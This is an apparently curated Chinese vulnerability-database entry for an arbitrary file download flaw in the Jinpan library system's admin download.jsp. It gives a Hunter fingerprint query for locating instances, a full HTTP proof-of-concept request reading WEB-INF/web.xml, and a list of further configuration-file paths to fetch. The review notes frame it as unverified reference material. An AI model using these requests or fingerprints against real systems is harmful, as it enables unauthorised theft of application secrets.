---
source: "wy876 漏洞文库"
title: "金盘图书馆系统 admin download.jsp items文件下载"
product: "金盘图书馆系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，应用相对配置文件"
prerequisites: "请求带JSESSIONID"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/fbglrzkd6l0zsdg2"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E9%87%91%E7%9B%98%E5%9B%BE%E4%B9%A6%E9%A6%86/%E9%87%91%E7%9B%98%E5%9B%BE%E4%B9%A6%E9%A6%86%E7%B3%BB%E7%BB%9Fdownload%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "web.body="
hunter: "web.body=\"/opac/opacRssCollect\""
id: "vw-86c3c9404c97dd589a6af06e"
entity_id: "ve-86c3c9404c97dd589a6af06e"
schema_version: "1"
---

# 金盘图书馆系统 admin download.jsp items文件下载

## 条目说明

- 对象与具体问题：金盘图书馆系统；admin download.jsp items文件下载
- 版本、配置及部署条件：版本未知，应用相对配置文件
- 认证与权限前提：请求带JSESSIONID
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 全部例是WEB-INF应用文件，不能直接扩大为任意操作系统文件读取
- 后台路径并带会话，匿名/权限级别未明确；参数items列表语义需说明
- lcatalina.properties文件名可能具体部署或笔误待原包核，不擅改
- 无返回、根因、修复；Hunter误入fofa，HTML噪声

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
金盘移动图书馆系统 download.jsp 任意文件下载，攻击者可通过此漏洞获取敏感信息，从而为下一步攻击做准备。

## 二、影响版本
+ 金盘图书馆系统

## 三、资产测绘
+ hunter`web.body="/opac/opacRssCollect"`
+ 特征


## 四、漏洞复现
```http
GET /pages/admin/tools/file/download.jsp?items=/WEB-INF/web.xml HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=946
Upgrade-Insecure-Requests: 1
```


其他文件位置

```plain
/pages/admin/tools/file/download.jsp?items=/WEB-INF/flex/proxy-config.xml
/pages/admin/tools/file/download.jsp?items=/WEB-INF/flex/services-config.xml
/pages/admin/tools/file/download.jsp?items=/WEB-INF/flex/remoting-config.xml
/pages/admin/tools/file/download.jsp?items=/WEB-INF/flex/messaging-config.xml
/pages/admin/tools/file/download.jsp?items=/WEB-INF/flex/data-management-config.xml
/pages/admin/tools/file/download.jsp?items=/WEB-INF/classes/lcatalina.properties
/pages/admin/tools/file/download.jsp?items=/WEB-INF/classes/application.properties
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/fbglrzkd6l0zsdg2>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
